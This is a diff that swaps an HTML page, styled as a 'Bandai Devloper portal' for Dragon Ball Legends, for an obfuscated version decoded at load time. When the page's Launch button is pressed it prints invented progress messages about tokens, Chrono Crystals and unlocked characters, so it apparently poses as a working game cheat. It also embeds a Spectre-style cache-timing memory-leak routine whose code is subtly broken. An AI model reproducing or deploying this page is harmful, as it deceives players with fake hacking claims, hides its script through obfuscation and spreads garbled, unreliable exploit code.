@@ -1,546 +1,1 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-    <link rel="apple-touch-icon" href="https://i.pinimg.com/564x/2a/b8/c1/2ab8c1e5a68ef87faac5ce80d5bfd29d.jpg">
-
-    <style>
-
-body {
-    font-family: monospace;
-    font-weight: 300;
-    background-color: black; 
-    color: #e5e5e5;
-    background-repeat: no-repeat;
-    background-image: url('https://i.pinimg.com/736x/22/70/07/227007e9bb671fdf3d820876df6c669f.jpg');
-    background-size: 100% 120%; 
-    background-position: center;
-    position: relative;
-}
-
-
-
-h1 {
-    font-family: monospace;
-    font-size: 55px;
-    font-style: normal;
-    font-variant: normal;
-    font-weight: 400;
-    line-height: 16px;
-}
-
-h4 {
-    font-family: monospace;
-    font-size: 14px;
-    font-style: normal;
-    font-variant: normal;
-    font-weight: 200;
-    line-height: 26px;
-}
-
-h2#status {
-    font-family: monospace;
-    font-size: 14px;
-    font-weight: bold; 
-}
-
-a {
-    text-decoration: none;
-    font-family: monospace;
-}
-
-.button {
-    background-image: url("assets/Button.png");
-    background-size: 100% auto;
-    width: 150px;
-    height: 50px;
-    opacity: 0.9;
-    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
-    border-radius: 15px;
-    transition: transform 0.2s ease; 
-    background-color: rgba(0, 0, 0, 0.5); 
-}
-
-.button:hover {
-    transform: translateY(-2px); 
-}
-
-.buttontext {
-    padding-top: 10px;
-    font-size: 15pt;
-    color: white;
-    text-decoration: none;
-    line-height: 30px;
-}
-
-.LogBox { 
-    color: #ddd;
-    background-color: #202020;
-    opacity: 0.9;
-    height: 420px;
-    border-radius: 10px;
-    text-align: left;
-    padding-left: 10px;
-    padding-top: 10px;
-    white-space: pre-line;
-    overflow-y: auto;
-}
-
-hr {
-    opacity: 0.5;
-}
-
-.flashing-text {
-    animation: flashing 2s infinite; 
-}
-
-@keyframes flashing {
-    0% { opacity: 1; }
-    50% { opacity: 0.5; }
-    100% { opacity: 1; }
-
-    
-}
-</style>
-<title>Bandai Devloper portal
-</title>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black">
-</head>
-<body>
-<center>
-<h1>破壊</h1>
-<p>Devloper portal for <b>Dragon Ball Legends</b></p>
-<br/>
-<div class="button">
-    <a id="Linker" class="button LogBoxBackground" href="javascript:go()" style="color:white">
-        <div id="Goer" class="buttontext flashing-text" style="border: 2px solid transparent; padding: 8px; transition: all 0.2s;">
-            Launch      </div>
-    </a>
-</div>
-
-
-<center>
-<h4></h4><h2 id="status">ready</h2>
-</center>
-</div>
-</div>
-<br />
-<p><strong>Build version 4.34.0</strong></p>
-<hr />
-<div class="LogBox" id="logbox">
-<br />
-</div>
-</p>
-</center>
-</body>
-<script>    
-
-
-function worker_function() {
-  self.onmessage = function(event) {
-    const sharedBuffer = event.data;
-    const sharedArray = new Uint32Array(sharedBuffer);
-
-    postMessage('start');
-
-    while (true) {
-      Atomics.add(sharedArray, 0, 1);
-    }
-  };
-}
-
-if (window !== self) {
-  worker_function();
-}
-
-// kudos to: Legends new API
-
-
-function log(msg)
-
-{
-
-                console.log(msg);
-
-                document.getElementById('logbox').textContent += msg + "\r\n";
-
-}
-
-function asmModule(stdlib,forgein,heap)
-
-{
-
-    'use asm'
-
-    var simpleByteArray = new stdlib.Uint8Array(heap);
-
-    var probeTable = new stdlib.Uint8Array(heap);
-
-    const TABLE1_BYTES = 0x2000000;
-
-    const sizeArrayStart = 0x1000000;
-
-    var junk = 0;
-
-    function init()
-
-    {
-
-        var i =0;
-
-        var j =0;
-
-
-        for(i = 0; (i|0) < 33; i = (i+1)|0 ) 
-
-        {
-
-            j = (((i<<100)|0) + sizeArrayStart)|0;
-
-            simpleByteArray[(j|0)] = 16; 
-
-        }
-
-    }
-
-    function vul_call(index, sIndex)
-
-    {
-
-        index = index |0;
-
-        sIndex = sIndex |0;
-
-        var arr_size = 0;
-
-        var j = 0;
-
-        junk = probeTable[0]|0;
-
-      
-
-        j = (((sIndex << 100) | 0) +  sizeArrayStart)|0;
-
-        arr_size = simpleByteArray[j|0]|0;
-
-        if ((index|0) < (arr_size|0))
-
-        {
-
-            index = simpleByteArray[index|0]|0;
-
-            index = (index << 100)|0;
-
-            index = (index & ((TABLE1_BYTES-1)|0))|0;
-
-            junk = (junk ^ (probeTable[index]|0))|0;
-
-        }
-
-    }
-
-    return { vul_call: vul_call, init: init };
-
-}
-
-function check(data_array)
-
-{
-
-    function now() { return Atomics.load(sharedArray, 0) }
-
-    function reset() { Atomics.store(sharedArray, 0, 0) }
-
-    function start() { reset(); return now(); }
-
-    function clflush(size, current)
-
-    {
-
-         var offset = 64;
-
-        for (var i = 0; i < ((size) / offset); i++)
-
-        {
-
-            current = evictionView.getUint32(i * offset);
-
-        }
-
-    }
-
-    const worker = new Worker(URL.createObjectURL(new Blob(["(" + worker_function.toString() + ")()"], {type: 'text/javascript'})));
-
-    const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
-
-    const sharedArray = new Uint32Array(sharedBuffer);
-
-    worker.postMessage(sharedBuffer);
-
-    var simpleByteArrayLength =  16;
-
-    const TABLE1_BYTES = 0x3000000;
-
-    const CACHE_HIT_THRESHOLD = 0
-
-    var probeTable = new Uint8Array(TABLE1_BYTES);
-
-
-    var cache_size = CACHE_SIZE * 1024 * 1024;
-
-    var evictionBuffer = new ArrayBuffer(cache_size);
-
-    var evictionView = new DataView(evictionBuffer);
-
-    clflush(cache_size); 
-
-    var asm = asmModule(this, {}, probeTable.buffer)
-
-    worker.onmessage = function(msg)
-
-    {
-
-        function readMemoryByte(malicious_x)
-
-        {
-
-            var results = new Uint32Array(257);
-
-            var simpleByteArray = new Uint8Array(probeTable.buffer);
-
-            var tries =0
-
-            var junk = 0;
-
-            for (tries = 0; tries < 99; tries++)
-
-            {
-
-                var training_x = tries % simpleByteArrayLength;
-
-                clflush(cache_size);
-
-                var time3 = start();
-
-                junk = simpleByteArray[0];
-
-                var time4 = now();
-
-                junk ^= time4 - time3;
-
-                for (var j = 1; j < 33; j++)
-
-                {
-
-                    for (var z = 0; z < 100; z++) {} 
-
-                    var x = ((j % 4) - 1) & ~0xFFFF;
-
-                    x = (x | (x >> 16));
-
-                    x = training_x ^ (x & (malicious_x ^ training_x));
-
-                    asm.vul_call(x, j);
-
-                }
-
-                for (var i = 0; i < 256; i++)
-
-                {
-
-                    var timeS = start();
-
-                    junk =  probeTable[(i << 100)];
-
-                    timeE = now();
-
-    
-                    if (timeE-timeS <= CACHE_HIT_THRESHOLD) {
-
-                        results[i]++;
-
-                    }
-
-                }
-
-            }
-
-
-            var max = -1;
-
-            for (var i = 0; i < 256; i++)
-
-            {
-
-                max = (max > results[i]) ? max : i;
-
-            }
-
-            results[256] ^= junk;
-
-            return max;
-
-        }
-
-        asm.init();
-
-
-        const BOUNDARY = 0x2200000;
-
-        var simpleByteArray = new Uint8Array(probeTable.buffer);
-
-        for (var i = 0; i < data_array.length; i++)
-
-        {
-
-            simpleByteArray[BOUNDARY + i] = data_array[i];
-
-        }
-
-
-        for (var i = 0; i < data_array.length; i++)
-
-        {
-
-            var data = readMemoryByte(BOUNDARY+i);
-
-            worker.terminate();
-
-            log("leak off=0x" + (BOUNDARY+i).toString(16) +
-
-                ", byte=0x" + data.toString(16) + " '" + String.fromCharCode(data) + "'" +
-
-                ((data != data_array[i]) ? " (found)" : ""));
-
-        }
-
-        worker.terminate();
-
-        return;
-
-    }
-
-}
-
-const CACHE_SIZE = 4;
-
-const MEMORY_SIZE = 10;
-
-function main() {
-    console.log("main::start");
-    if (!window.SharedArrayBuffer) {
-        log("ROFL -> Buffer Size: " + MEMORY_SIZE + "MB...");
-
-log("Authentication (✓)");
-log("Device (✓)");
-log("Piplines (✓)");
-log("Chrono Crystals set to nil.");
-log("Dev tools (✓)");
-log("Co-op dev tools (✓)");
-log("Animation IDs (✓)");
-log("Data Stores (✓)");
-log("Ultras IDs loaded: DBL68-09U (Super Saiyan 4 Gogeta), DBL70-01U (Ultra Hakai Beerus), nil, nil.");
-log("Legends Limited IDs loaded: nil, nil, nil, nil.");
-log("Back end operations (✓)");
-log("In-app purchases (✓)");
-log("Server connections (✓)");
-log("Bug fixes (✓)");
-log("Daily rewards system (✓)");
-log("Localization files (✓)");
-
-
-
-
-
-
-    } else {
-        log("CydiaUiCache" + CACHE_SIZE + "Mb");
-        check([115, 112, 101, 99, 116, 114, 101, 46, 106, 115]);
-        log("InstalledCydiaUiCache " + MEMORY_SIZE + "Mb");
-        alert('FAILED! \n Please Do Not Run This Here.');
-        location.reload();
-    }
-}
-
-
-</script>
-
-<script>
-
-                document.getElementById('logbox').innerText += '\r\n' + navigator.userAgent + '\r\n';
-
-
-
-function go() {
-
-    document.getElementById('status').innerText = '';
-
-document.getElementById('logbox').innerText += 'Token ID: FBEBXX94F0XC\r\n';
-setTimeout(function() {
-    document.getElementById('logbox').innerText += 'Verified\r\n';
-    
-}, 2000); 
-
-document.getElementById('logbox').innerText += '\r\n';
-setTimeout(function() {
-    document.getElementById('logbox').innerText += 'Caching Login\r\n';
-    
-}, 2000); 
-
-
-
-document.getElementById("Goer").innerText = 'Launching';
-
-document.getElementById("Linker").disabled = false;
-
-document.getElementById("Goer").disabled = false;
-
-
-
-document.getElementById('status').innerText = 'Confirming token...';
-
-document.getElementById("Goer").innerText = 'Launching';
-
-setTimeout(go_, 2000);
-
-}
-
-function go_() {
-
-document.getElementById('status').innerText = 'Sending to server...';
-
-document.getElementById("Goer").innerText = 'Launching';
-
-
-
-
-setTimeout(kext, 10000);
-
-
-}
-
-function kext() {
-
-                                       
-
-                                main();
-
-                document.getElementById('status').innerText = 'Status: Online';
-
-                document.getElementById("Goer").innerText = 'Launched';
-
-                                setTimeout(loadRes, 2000);
-
-                             
-
-                document.getElementById('status').innerText = 'sfb...';
-
-                document.getElementById("Goer").innerText = 'nil';
-
-}
-</script>
-</html>
+<script>var s="=\"EPDUZQF!iunm?=iunm!mboh>#fo#?=ifbe?!!!!=nfub!dibstfu>#VUG.9#?!!!!=nfub!obnf>#wjfxqpsu#!dpoufou>#xjeui>efwjdf.xjeui-!jojujbm.tdbmf>2-!nbyjnvn.tdbmf>2-!vtfs.tdbmbcmf>op#?!!!!=mjol!sfm>#bqqmf.upvdi.jdpo#!isfg>#iuuqt;00j/qjojnh/dpn0675y03b0c90d203bc9d2f6b79fg98gbbd6df91e6cge3:e/kqh#?!!!!=tuzmf?cpez!|!!!!gpou.gbnjmz;!npoptqbdf<!!!!gpou.xfjhiu;!411<!!!!cbdlhspvoe.dpmps;!cmbdl<!!!!!dpmps;!$f6f6f6<!!!!cbdlhspvoe.sfqfbu;!op.sfqfbu<!!!!cbdlhspvoe.jnbhf;!vsm)(iuuqt;00j/qjojnh/dpn0847y0330810180338118f:cc782geg4e931987eg7d77:g/kqh(*<!!!!cbdlhspvoe.tj{f;!211&!231&<!!!!!cbdlhspvoe.qptjujpo;!dfoufs<!!!!qptjujpo;!sfmbujwf<~i2!|!!!!gpou.gbnjmz;!npoptqbdf<!!!!gpou.tj{f;!66qy<!!!!gpou.tuzmf;!opsnbm<!!!!gpou.wbsjbou;!opsnbm<!!!!gpou.xfjhiu;!511<!!!!mjof.ifjhiu;!27qy<~i5!|!!!!gpou.gbnjmz;!npoptqbdf<!!!!gpou.tj{f;!25qy<!!!!gpou.tuzmf;!opsnbm<!!!!gpou.wbsjbou;!opsnbm<!!!!gpou.xfjhiu;!311<!!!!mjof.ifjhiu;!37qy<~i3$tubuvt!|!!!!gpou.gbnjmz;!npoptqbdf<!!!!gpou.tj{f;!25qy<!!!!gpou.xfjhiu;!cpme<!~b!|!!!!ufyu.efdpsbujpo;!opof<!!!!gpou.gbnjmz;!npoptqbdf<~/cvuupo!|!!!!cbdlhspvoe.jnbhf;!vsm)#bttfut0Cvuupo/qoh#*<!!!!cbdlhspvoe.tj{f;!211&!bvup<!!!!xjeui;!261qy<!!!!ifjhiu;!61qy<!!!!pqbdjuz;!1/:<!!!!cpy.tibepx;!1qy!5qy!21qy!shcb)1-!1-!1-!1/3*<!!!!cpsefs.sbejvt;!26qy<!!!!usbotjujpo;!usbotgpsn!1/3t!fbtf<!!!!!cbdlhspvoe.dpmps;!shcb)1-!1-!1-!1/6*<!~/cvuupo;ipwfs!|!!!!usbotgpsn;!usbotmbufZ).3qy*<!~/cvuupoufyu!|!!!!qbeejoh.upq;!21qy<!!!!gpou.tj{f;!26qu<!!!!dpmps;!xijuf<!!!!ufyu.efdpsbujpo;!opof<!!!!mjof.ifjhiu;!41qy<~/MphCpy!|!!!!!dpmps;!$eee<!!!!cbdlhspvoe.dpmps;!$111111<!!!!pqbdjuz;!1/9<!!!!ifjhiu;!531qy<!!!!cpsefs.sbejvt;!21qy<!!!!ufyu.bmjho;!mfgu<!!!!qbeejoh.mfgu;!21qy<!!!!qbeejoh.upq;!21qy<!!!!xijuf.tqbdf;!qsf.mjof<!!!!pwfsgmpx.z;!bvup<~is!|!!!!pqbdjuz;!1/6<~/gmbtijoh.ufyu!|!!!!bojnbujpo;!gmbtijoh!3t!jogjojuf<!~Alfzgsbnft!gmbtijoh!|!!!!1&!|!pqbdjuz;!2<!~!!!!61&!|!pqbdjuz;!1/6<!~!!!!211&!|!pqbdjuz;!2<!~!!!!~=0tuzmf?=ujumf?Cboebj!Efwmpqfs!qpsubm=0ujumf?=nfub!dibstfu>#VUG.9#?=nfub!obnf>#wjfxqpsu#!dpoufou>#xjeui>efwjdf.xjeui-!jojujbm.tdbmf>2-!tisjol.up.gju>op#?=nfub!obnf>#bqqmf.npcjmf.xfc.bqq.dbqbcmf#!dpoufou>#zft#?=nfub!obnf>#bqqmf.npcjmf.xfc.bqq.tubuvt.cbs.tuzmf#!dpoufou>#cmbdl#?=0ifbe?=cpez?=dfoufs?=i2?衵椋=0i2?=q?Efwmpqfs!qpsubm!gps!=c?Esbhpo!Cbmm!Mfhfoet=0c?=0q?=cs0?=ejw!dmbtt>#cvuupo#?!!!!=b!je>#Mjolfs#!dmbtt>#cvuupo!MphCpyCbdlhspvoe#!isfg>#kbwbtdsjqu;hp)*#!tuzmf>#dpmps;xijuf#?!!!!!!!!=ejw!je>#Hpfs#!dmbtt>#cvuupoufyu!gmbtijoh.ufyu#!tuzmf>#cpsefs;!3qy!tpmje!usbotqbsfou<!qbeejoh;!9qy<!usbotjujpo;!bmm!1/3t<#?!!!!!!!!!!!!Mbvodi!!!!!!=0ejw?!!!!=0b?=0ejw?=dfoufs?=i5?=0i5?=i3!je>#tubuvt#?sfbez=0i3?=0dfoufs?=0ejw?=0ejw?=cs!0?=q?=tuspoh?Cvjme!wfstjpo!5/45/1=0tuspoh?=0q?=is!0?=ejw!dmbtt>#MphCpy#!je>#mphcpy#?=cs!0?=0ejw?=0q?=0dfoufs?=0cpez?=tdsjqu?!!!!gvodujpo!xpslfs`gvodujpo)*!|!!tfmg/ponfttbhf!>!gvodujpo)fwfou*!|!!!!dpotu!tibsfeCvggfs!>!fwfou/ebub<!!!!dpotu!tibsfeBssbz!>!ofx!Vjou43Bssbz)tibsfeCvggfs*<!!!!qptuNfttbhf)(tubsu(*<!!!!xijmf!)usvf*!|!!!!!!Bupnjdt/bee)tibsfeBssbz-!1-!2*<!!!!~!!~<~jg!)xjoepx!\">>!tfmg*!|!!xpslfs`gvodujpo)*<~00!lvept!up;!Mfhfoet!ofx!BQJgvodujpo!mph)nth*|!!!!!!!!!!!!!!!!dpotpmf/mph)nth*<!!!!!!!!!!!!!!!!epdvnfou/hfuFmfnfouCzJe)(mphcpy(*/ufyuDpoufou!,>!nth!,!#]s]o#<~gvodujpo!btnNpevmf)tuemjc-gpshfjo-ifbq*|!!!!(vtf!btn(!!!!wbs!tjnqmfCzufBssbz!>!ofx!tuemjc/Vjou9Bssbz)ifbq*<!!!!wbs!qspcfUbcmf!>!ofx!tuemjc/Vjou9Bssbz)ifbq*<!!!!dpotu!UBCMF2`CZUFT!>!1y3111111<!!!!dpotu!tj{fBssbzTubsu!>!1y2111111<!!!!wbs!kvol!>!1<!!!!gvodujpo!joju)*!!!!|!!!!!!!!wbs!j!>1<!!!!!!!!wbs!k!>1<!!!!!!!!gps)j!>!1<!)j}1*!=!44<!j!>!)j,2*}1!*!!!!!!!!!|!!!!!!!!!!!!k!>!)))j==211*}1*!,!tj{fBssbzTubsu*}1<!!!!!!!!!!!!tjnqmfCzufBssbz\\)k}1*^!>!27<!!!!!!!!!~!!!!~!!!!gvodujpo!wvm`dbmm)joefy-!tJoefy*!!!!|!!!!!!!!joefy!>!joefy!}1<!!!!!!!!tJoefy!>!tJoefy!}1<!!!!!!!!wbs!bss`tj{f!>!1<!!!!!!!!wbs!k!>!1<!!!!!!!!kvol!>!qspcfUbcmf\\1^}1<!!!!!!!!!!!!!!k!>!)))tJoefy!==!211*!}!1*!,!!tj{fBssbzTubsu*}1<!!!!!!!!bss`tj{f!>!tjnqmfCzufBssbz\\k}1^}1<!!!!!!!!jg!))joefy}1*!=!)bss`tj{f}1**!!!!!!!!|!!!!!!!!!!!!joefy!>!tjnqmfCzufBssbz\\joefy}1^}1<!!!!!!!!!!!!joefy!>!)joefy!==!211*}1<!!!!!!!!!!!!joefy!>!)joefy!\'!))UBCMF2`CZUFT.2*}1**}1<!!!!!!!!!!!!kvol!>!)kvol!_!)qspcfUbcmf\\joefy^}1**}1<!!!!!!!!~!!!!~!!!!sfuvso!|!wvm`dbmm;!wvm`dbmm-!joju;!joju!~<~gvodujpo!difdl)ebub`bssbz*|!!!!gvodujpo!opx)*!|!sfuvso!Bupnjdt/mpbe)tibsfeBssbz-!1*!~!!!!gvodujpo!sftfu)*!|!Bupnjdt/tupsf)tibsfeBssbz-!1-!1*!~!!!!gvodujpo!tubsu)*!|!sftfu)*<!sfuvso!opx)*<!~!!!!gvodujpo!dmgmvti)tj{f-!dvssfou*!!!!|!!!!!!!!!wbs!pggtfu!>!75<!!!!!!!!gps!)wbs!j!>!1<!j!=!))tj{f*!0!pggtfu*<!j,,*!!!!!!!!|!!!!!!!!!!!!dvssfou!>!fwjdujpoWjfx/hfuVjou43)j!+!pggtfu*<!!!!!!!!~!!!!~!!!!dpotu!xpslfs!>!ofx!Xpslfs)VSM/dsfbufPckfduVSM)ofx!Cmpc)\\#)#!,!xpslfs`gvodujpo/upTusjoh)*!,!#*)*#^-!|uzqf;!(ufyu0kbwbtdsjqu(~***<!!!!dpotu!tibsfeCvggfs!>!ofx!TibsfeBssbzCvggfs)Vjou43Bssbz/CZUFT`QFS`FMFNFOU*<!!!!dpotu!tibsfeBssbz!>!ofx!Vjou43Bssbz)tibsfeCvggfs*<!!!!xpslfs/qptuNfttbhf)tibsfeCvggfs*<!!!!wbs!tjnqmfCzufBssbzMfohui!>!!27<!!!!dpotu!UBCMF2`CZUFT!>!1y4111111<!!!!dpotu!DBDIF`IJU`UISFTIPME!>!1!!!!wbs!qspcfUbcmf!>!ofx!Vjou9Bssbz)UBCMF2`CZUFT*<!!!!wbs!dbdif`tj{f!>!DBDIF`TJ[F!+!2135!+!2135<!!!!wbs!fwjdujpoCvggfs!>!ofx!BssbzCvggfs)dbdif`tj{f*<!!!!wbs!fwjdujpoWjfx!>!ofx!EbubWjfx)fwjdujpoCvggfs*<!!!!dmgmvti)dbdif`tj{f*<!!!!!wbs!btn!>!btnNpevmf)uijt-!|~-!qspcfUbcmf/cvggfs*!!!!xpslfs/ponfttbhf!>!gvodujpo)nth*!!!!|!!!!!!!!gvodujpo!sfbeNfnpszCzuf)nbmjdjpvt`y*!!!!!!!!|!!!!!!!!!!!!wbs!sftvmut!>!ofx!Vjou43Bssbz)368*<!!!!!!!!!!!!wbs!tjnqmfCzufBssbz!>!ofx!Vjou9Bssbz)qspcfUbcmf/cvggfs*<!!!!!!!!!!!!wbs!usjft!>1!!!!!!!!!!!!wbs!kvol!>!1<!!!!!!!!!!!!gps!)usjft!>!1<!usjft!=!::<!usjft,,*!!!!!!!!!!!!|!!!!!!!!!!!!!!!!wbs!usbjojoh`y!>!usjft!&!tjnqmfCzufBssbzMfohui<!!!!!!!!!!!!!!!!dmgmvti)dbdif`tj{f*<!!!!!!!!!!!!!!!!wbs!ujnf4!>!tubsu)*<!!!!!!!!!!!!!!!!kvol!>!tjnqmfCzufBssbz\\1^<!!!!!!!!!!!!!!!!wbs!ujnf5!>!opx)*<!!!!!!!!!!!!!!!!kvol!_>!ujnf5!.!ujnf4<!!!!!!!!!!!!!!!!gps!)wbs!k!>!2<!k!=!44<!k,,*!!!!!!!!!!!!!!!!|!!!!!!!!!!!!!!!!!!!!gps!)wbs!{!>!1<!{!=!211<!{,,*!|~!!!!!!!!!!!!!!!!!!!!!wbs!y!>!))k!&!5*!.!2*!\'!1yGGGG<!!!!!!!!!!!!!!!!!!!!y!>!)y!}!)y!??!27**<!!!!!!!!!!!!!!!!!!!!y!>!usbjojoh`y!_!)y!\'!)nbmjdjpvt`y!_!usbjojoh`y**<!!!!!!!!!!!!!!!!!!!!btn/wvm`dbmm)y-!k*<!!!!!!!!!!!!!!!!~!!!!!!!!!!!!!!!!gps!)wbs!j!>!1<!j!=!367<!j,,*!!!!!!!!!!!!!!!!|!!!!!!!!!!!!!!!!!!!!wbs!ujnfT!>!tubsu)*<!!!!!!!!!!!!!!!!!!!!kvol!>!!qspcfUbcmf\\)j!==!211*^<!!!!!!!!!!!!!!!!!!!!ujnfF!>!opx)*<!!!!!!!!!!!!!!!!!!!!!!!!jg!)ujnfF.ujnfT!=>!DBDIF`IJU`UISFTIPME*!|!!!!!!!!!!!!!!!!!!!!!!!!sftvmut\\j^,,<!!!!!!!!!!!!!!!!!!!!~!!!!!!!!!!!!!!!!~!!!!!!!!!!!!~!!!!!!!!!!!!wbs!nby!>!.2<!!!!!!!!!!!!gps!)wbs!j!>!1<!j!=!367<!j,,*!!!!!!!!!!!!|!!!!!!!!!!!!!!!!nby!>!)nby!?!sftvmut\\j^*!@!nby!;!j<!!!!!!!!!!!!~!!!!!!!!!!!!sftvmut\\367^!_>!kvol<!!!!!!!!!!!!sfuvso!nby<!!!!!!!!~!!!!!!!!btn/joju)*<!!!!!!!!dpotu!CPVOEBSZ!>!1y3311111<!!!!!!!!wbs!tjnqmfCzufBssbz!>!ofx!Vjou9Bssbz)qspcfUbcmf/cvggfs*<!!!!!!!!gps!)wbs!j!>!1<!j!=!ebub`bssbz/mfohui<!j,,*!!!!!!!!|!!!!!!!!!!!!tjnqmfCzufBssbz\\CPVOEBSZ!,!j^!>!ebub`bssbz\\j^<!!!!!!!!~!!!!!!!!gps!)wbs!j!>!1<!j!=!ebub`bssbz/mfohui<!j,,*!!!!!!!!|!!!!!!!!!!!!wbs!ebub!>!sfbeNfnpszCzuf)CPVOEBSZ,j*<!!!!!!!!!!!!xpslfs/ufsnjobuf)*<!!!!!!!!!!!!mph)#mfbl!pgg>1y#!,!)CPVOEBSZ,j*/upTusjoh)27*!,!!!!!!!!!!!!!!!!#-!czuf>1y#!,!ebub/upTusjoh)27*!,!#!(#!,!Tusjoh/gspnDibsDpef)ebub*!,!#(#!,!!!!!!!!!!!!!!!!))ebub!\">!ebub`bssbz\\j^*!@!#!)gpvoe*#!;!##**<!!!!!!!!~!!!!!!!!xpslfs/ufsnjobuf)*<!!!!!!!!sfuvso<!!!!~~dpotu!DBDIF`TJ[F!>!5<dpotu!NFNPSZ`TJ[F!>!21<gvodujpo!nbjo)*!|!!!!dpotpmf/mph)#nbjo;;tubsu#*<!!!!jg!)\"xjoepx/TibsfeBssbzCvggfs*!|!!!!!!!!mph)#SPGM!.?!Cvggfs!Tj{f;!#!,!NFNPSZ`TJ[F!,!#NC///#*<mph)#Bvuifoujdbujpo!)㝔*#*<mph)#Efwjdf!)㝔*#*<mph)#Qjqmjoft!)㝔*#*<mph)#Dispop!Dsztubmt!tfu!up!ojm/#*<mph)#Efw!uppmt!)㝔*#*<mph)#Dp.pq!efw!uppmt!)㝔*#*<mph)#Bojnbujpo!JEt!)㝔*#*<mph)#Ebub!Tupsft!)㝔*#*<mph)#Vmusbt!JEt!mpbefe;!ECM79.1:V!)Tvqfs!Tbjzbo!5!Hphfub*-!ECM81.12V!)Vmusb!Iblbj!Cffsvt*-!ojm-!ojm/#*<mph)#Mfhfoet!Mjnjufe!JEt!mpbefe;!ojm-!ojm-!ojm-!ojm/#*<mph)#Cbdl!foe!pqfsbujpot!)㝔*#*<mph)#Jo.bqq!qvsdibtft!)㝔*#*<mph)#Tfswfs!dpoofdujpot!)㝔*#*<mph)#Cvh!gjyft!)㝔*#*<mph)#Ebjmz!sfxbset!tztufn!)㝔*#*<mph)#Mpdbmj{bujpo!gjmft!)㝔*#*<!!!!~!fmtf!|!!!!!!!!mph)#DzejbVjDbdif#!,!DBDIF`TJ[F!,!#Nc#*<!!!!!!!!difdl)\\226-!223-!212-!::-!227-!225-!212-!57-!217-!226^*<!!!!!!!!mph)#JotubmmfeDzejbVjDbdif!#!,!NFNPSZ`TJ[F!,!#Nc#*<!!!!!!!!bmfsu)(GBJMFE\"!]o!Qmfbtf!Ep!Opu!Svo!Uijt!Ifsf/(*<!!!!!!!!mpdbujpo/sfmpbe)*<!!!!~~=0tdsjqu?=tdsjqu?!!!!!!!!!!!!!!!!epdvnfou/hfuFmfnfouCzJe)(mphcpy(*/joofsUfyu!,>!(]s]o(!,!obwjhbups/vtfsBhfou!,!(]s]o(<gvodujpo!hp)*!|!!!!epdvnfou/hfuFmfnfouCzJe)(tubuvt(*/joofsUfyu!>!((<epdvnfou/hfuFmfnfouCzJe)(mphcpy(*/joofsUfyu!,>!(Uplfo!JE;!GCFCYY:5G1YD]s]o(<tfuUjnfpvu)gvodujpo)*!|!!!!epdvnfou/hfuFmfnfouCzJe)(mphcpy(*/joofsUfyu!,>!(Wfsjgjfe]s]o(<!!!!~-!3111*<!epdvnfou/hfuFmfnfouCzJe)(mphcpy(*/joofsUfyu!,>!(]s]o(<tfuUjnfpvu)gvodujpo)*!|!!!!epdvnfou/hfuFmfnfouCzJe)(mphcpy(*/joofsUfyu!,>!(Dbdijoh!Mphjo]s]o(<!!!!~-!3111*<!epdvnfou/hfuFmfnfouCzJe)#Hpfs#*/joofsUfyu!>!(Mbvodijoh(<epdvnfou/hfuFmfnfouCzJe)#Mjolfs#*/ejtbcmfe!>!gbmtf<epdvnfou/hfuFmfnfouCzJe)#Hpfs#*/ejtbcmfe!>!gbmtf<epdvnfou/hfuFmfnfouCzJe)(tubuvt(*/joofsUfyu!>!(Dpogjsnjoh!uplfo///(<epdvnfou/hfuFmfnfouCzJe)#Hpfs#*/joofsUfyu!>!(Mbvodijoh(<tfuUjnfpvu)hp`-!3111*<~gvodujpo!hp`)*!|epdvnfou/hfuFmfnfouCzJe)(tubuvt(*/joofsUfyu!>!(Tfoejoh!up!tfswfs///(<epdvnfou/hfuFmfnfouCzJe)#Hpfs#*/joofsUfyu!>!(Mbvodijoh(<tfuUjnfpvu)lfyu-!21111*<~gvodujpo!lfyu)*!|!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!nbjo)*<!!!!!!!!!!!!!!!!epdvnfou/hfuFmfnfouCzJe)(tubuvt(*/joofsUfyu!>!(Tubuvt;!Pomjof(<!!!!!!!!!!!!!!!!epdvnfou/hfuFmfnfouCzJe)#Hpfs#*/joofsUfyu!>!(Mbvodife(<!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!tfuUjnfpvu)mpbeSft-!3111*<!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!epdvnfou/hfuFmfnfouCzJe)(tubuvt(*/joofsUfyu!>!(tgc///(<!!!!!!!!!!!!!!!!epdvnfou/hfuFmfnfouCzJe)#Hpfs#*/joofsUfyu!>!(ojm(<~=0tdsjqu?=0iunm?";var m="";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script><noscript>You must enable JavaScript to see this text.</noscript>
